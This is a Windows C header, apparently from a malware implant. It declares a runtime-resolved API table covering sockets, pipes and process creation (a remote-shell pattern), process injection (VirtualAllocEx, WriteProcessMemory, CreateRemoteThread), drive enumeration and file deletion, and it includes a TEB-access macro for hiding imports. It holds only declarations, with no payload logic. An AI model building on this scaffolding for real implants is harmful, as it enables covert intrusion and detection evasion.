#pragma once
#include <Windows.h>
//#include <shlobj_core.h>
#include <TlHelp32.h>
#include <wininet.h>
//#include <winternl.h>
#include <winsock.h>
#include "utils.h"
#include "libc.h"

#ifdef _M_X64
	#define GetTEB() ((PTEB_)__readgsqword_(FIELD_OFFSET(NT_TIB, Self)))
#else
	#define GetTEB() ((PTEB_)__readfsdword_(FIELD_OFFSET(NT_TIB, Self)))
#endif

typedef NTSTATUS(__stdcall* TRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSTATUS(__stdcall* TLdrLoadDll)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
typedef HMODULE(WINAPI* TLoadLibraryA)(LPCSTR);

typedef BOOL(WINAPI* Tconnect)(SOCKET, const SOCKADDR*, int);
typedef BOOL(WINAPI* Tsend)(SOCKET, const char*, int, int);
typedef BOOL(WINAPI* Trecv)(SOCKET, char*, int, int);
typedef BOOL(WINAPI* Tclosesocket)(SOCKET);
typedef u_short(WINAPI* Thtons)(u_short);
typedef u_long(WINAPI* Tinet_addr)(const char*);
typedef SOCKET(WINAPI* Tsocket)(int, int, int);
typedef int(WINAPI* TWSAStartup)(WORD, LPWSADATA);
typedef int(WINAPI* TWSAGetLastError)(void);
typedef int(WINAPI* Tselect)(int, fd_set FAR*, fd_set FAR*, fd_set FAR*, const struct timeval FAR*);
typedef int(WINAPI* Tsetsockopt)(SOCKET, int, int, const char*, int);

typedef LPWSTR(WINAPI* TlstrcpyW)(LPWSTR, LPCWSTR);
typedef LPWSTR(WINAPI* TlstrcatW)(LPWSTR, LPCWSTR);

typedef DWORD(WINAPI* TGetFileAttributesW)(LPCWSTR);
typedef HANDLE(WINAPI* TCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* TReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* TWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* TCloseHandle)(HANDLE);
typedef DWORD(WINAPI* TGetLastError)(void);
typedef BOOL(WINAPI* TCreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL(WINAPI* TWaitForSingleObject)(HANDLE, DWORD);
typedef void(WINAPI* TSleep)(DWORD);
typedef HANDLE(WINAPI* TCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* TTerminateThread)(HANDLE, DWORD);
typedef BOOL(WINAPI* TCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* TTerminateProcess)(HANDLE, UINT);
typedef FARPROC(WINAPI* TGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL(WINAPI* TPeekNamedPipe)(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage);
typedef HANDLE(WINAPI* TCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI* TCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* TCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef LPVOID(WINAPI* THeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL(WINAPI* THeapfree_)(HANDLE, DWORD, LPVOID);
typedef HANDLE(WINAPI* THeapCreate)(DWORD, SIZE_T, SIZE_T);
typedef LPVOID(WINAPI* THeaprealloc_)(HANDLE, DWORD, LPVOID, SIZE_T);
typedef BOOL(WINAPI* TDeleteFileA)(LPCSTR);
typedef BOOL(WINAPI* TFindClose)(HANDLE);
typedef DWORD(WINAPI* TGetLogicalDrives)(VOID);
typedef int(WINAPI* TMultiByteToWideChar)(UINT, DWORD, LPCCH, int, LPWSTR, int);
typedef HANDLE(WINAPI* TFindFirstFileW)(LPCWSTR, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI* TFindNextFileW)(HANDLE, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI* TRemoveDirectoryW)(LPCWSTR);
typedef BOOL(WINAPI* TDeleteFileW)(LPCWSTR);
typedef BOOL(WINAPI* TWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef LPVOID(WINAPI* TVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);

typedef struct ApiList {
	Tconnect connect;
	Tsocket socket;
	Tsend send;
	Trecv recv;
	Tclosesocket closesocket;
	Thtons htons;
	Tinet_addr inet_addr;
	TWSAStartup WSAStartup;
	TWSAGetLastError WSAGetLastError;
	Tselect select;
	Tsetsockopt setsockopt;

	TGetFileAttributesW GetFileAttributesW;
	TPeekNamedPipe PeekNamedPipe;
	TLoadLibraryA LoadLibraryA;
	TCreateFileA CreateFileA;
	TCreateProcessA CreateProcessA;
	TCreateRemoteThread CreateRemoteThread;
	THeapCreate HeapCreate;
	THeapfree_ Heapfree_;
	THeaprealloc_ Heaprealloc_;
	THeapAlloc HeapAlloc;
	TDeleteFileA DeleteFileA;
	TCreateFileW CreateFileW;
	TReadFile ReadFile;
	TWriteFile WriteFile;
	TCloseHandle CloseHandle;
	TGetLastError GetLastError;
	TCreatePipe CreatePipe;
	TWaitForSingleObject WaitForSingleObject;
	TSleep Sleep;
	TCreateThread CreateThread;
	TTerminateThread TerminateThread;
	TCreateProcessW CreateProcessW;
	TTerminateProcess TerminateProcess;
	TGetProcAddress GetProcAddress;
	TFindClose FindClose;
	TGetLogicalDrives GetLogicalDrives;
	TMultiByteToWideChar MultiByteToWideChar;
	TFindFirstFileW FindFirstFileW;
	TFindNextFileW FindNextFileW;
	TRemoveDirectoryW RemoveDirectoryW;
	TDeleteFileW DeleteFileW;
	TWriteProcessMemory WriteProcessMemory;
	TVirtualAllocEx VirtualAllocEx;

	TlstrcpyW lstrcpyW;
	TlstrcatW lstrcatW;
} API;

extern API Api;

void InitApis();
//void free_Apis(); Never called